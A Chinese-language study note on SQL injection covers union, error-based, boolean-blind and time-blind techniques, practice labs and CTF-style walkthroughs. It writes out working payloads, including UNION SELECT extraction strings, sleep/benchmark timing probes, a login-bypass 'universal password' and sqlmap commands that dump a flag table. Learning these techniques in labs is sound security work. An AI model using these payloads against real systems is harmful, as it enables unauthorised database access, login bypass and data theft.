# Web攻防-注入类

web应用程序没有对用户的输入进行校验，导致前端传入后端的参数可被用户控制，如果这个参数被带入数据库查询，就导致攻击者可以任意操作数据库查询语句。

1. SQL注入靶场
    - sqli-labs
    - DVMA
    - Web for pentester
2. SQL注入工具
    - sqlmap（kali中有集成）
    - 超级SQL注入工具
## SQL注入分类
1. 联合查询注入`UNION`

    假设原始SQL语句字段数为3（可以通过不断尝试获得），注入参数为id。可构造注入`?id=1' UNION SELECT 1,2,3 --+`其中1，2，3为占位符用以寻找回显点，`+`在发送给服务器后，会被自动解析为空格。

    一般网站的逻辑是：查询数据库，并只取结果的第一行显示在页面上。为了绕过这个，我们可以查询一个不存在的ID，故意构造一个报错，让查询结果的第一行为空，然后把我们自己的SELECT1，2，3数据外带出来。

    了解回显点后，我们可以将其替换为version(), database(), user()等函数，获得数据库的一些信息。
2. 报错注入：需要网页回显SQL报错信息。

    利用数据库在处理异常情况时返回的错误消息，来推断出数据库结构、字段名甚至数据内容。

    步骤
    
    ①发现潜在的注入点：在应用程序的输入点尝试输入单引号 (') 或其他常见的SQL注入字符，以观察是否引发数据库错误。

    ②引发错误信息：通过构造恶意SQL语句，使得数据库引发错误并返回详细错误信息。

    ③分析错误信息：从数据库返回的错误信息中提取关于数据库结构、表名、字段名等信息。

    ④逐步推断并获取数据：利用错误信息逐步构造更复杂的注入语句，最终获取所需数据

    经典错误注入利用函数：floor, extractvalue, updatexml
3. 基于布尔类型的盲注：当页面无法显示SQL查询的数据，但是正确的查询语句和错误的查询语句返回的结果不一样时可用。

    常用函数：
    - length: `and length(database())>7`猜测数据库名称大于7字符。可以不断尝试最终获得数据库名称长度。
    - left: `left(s,n)` 返回字符串s前n个字符。
        
        `and left(database(),1)>'a'`不断尝试获得数据库名称的第一个字母

        `and left(database(),2)>'aa'`同理获得第二个字母。
    - mid: `MID(s, start, len)`返回s字符串从start开始的len个字符。

        `and mid(user(),1,1)>'a'`猜测当前用户的第一个字母（因为start取1，所以等同于left）
    - substr 用法与mid完全一样，一个不能用就试另一个。
    - ascii: ascii(s)返回字符串s的第一个字母的ASCII码。

        `and ascii(user())>114`    
        `and ascii(mid(user(),2,1))>114`

        ascii的作用是绕过网站对单引号的限制。因为直接比对字符（如mid(...)='s'）需要用到单引号。如果网站对单引号进行了过滤（转义），注入就会失败。于是写成：ascii(mid(database(),1,1))=115。
    - 其它：ord, if, regexp, cast, ifnull 等。
4. 基于时间类型的盲注：页面啥也不回显，最后手段。

    原理类似报错注入，条件成功时触发sleep函数的延时效果。

    `and 1=if(ascii(mid(database(),1,1)>115,1,sleep(5))`大于115返回1（看不到），否则休眠5秒（可感知）。

    MySQL中还可以用benchmark函数进行延时。`benchmark(count,expr)`：将expr表达式运行计算count次，通过大量计算占用cpu性能来实现延时。

    `and 1=if(ascii(mid(database(),1,1)>115,1,benchmark(10000000000,md5(152)))`
## SQL注入漏洞实战
1. 基础的联合查询注入

    ①先利用order by判断列数

    `?id=1' order by 4--+`按第4列排序后输出，一个个试出列数。

    ②查询库名并判断回显点

    `?id=-1' union select database(),2,3,4--+`

    ③继续注入，获得flag

    `?id=-1' union select 1,2,3,select group_concat(content separator 0x3c62723e)from flag_is_here)--+`

    - group_concat(content)：content: 这是你想读取的列名（字段名）。group_concat(): 是 MySQL 的一个聚合函数。用了它之后：数据库会把这100行（假设有100行数据）的content合并成一个超长的字符串返回。
    - separator 0x3c62723e：指定分隔符。separator: 指定合并数据时用什么符号隔开。默认是逗号。0x3c62723e: 这是十六进制编码，转换成 ASCII 码就是 \<br>。用以规避对引号的限制。
2. 万能密码注入

    先尝试简单payload，猜测SQl语句，再构造永真条件，绕过登录限制。

    永真条件例如
    `name='='&pass='='` `name=1' or 1-- &pass=152`
3. 基于报错的注入

    payload太长，遇到再学。
4. 基于时间类型的盲注

    漏洞点较为隐蔽，一般采用sqlmap发现。

    `sqlmap -u "xxxx/?id=1" --flush-session`扫描某网站。--flush-session的作用：刷新/清除当前目标的 Session 文件。

    `sqlmap -u "xxxx/?id=1" -D db -T flag_is_here -C content --dump --technique=T`提取flag
    - --dump：意为“导出/下载”。作用是把指定列（content）里的所有行数据全部读取出来，并保存到本地的 SQLmap 文件夹中，同时在屏幕上以表格形式打印出来。
    - --technique=T 这是这条指令最特别的地方。--technique 用于指定 SQLmap 使用哪种 注入技术。
        - B: Boolean-based blind（布尔盲注）
        - E: Error-based（报错注入，利用 updatexml 等函数）
        - U: Union query-based（联合查询注入，利用 UNION SELECT）
        - S: Stacked queries（堆叠注入）
        - T: Time-based blind（时间盲注）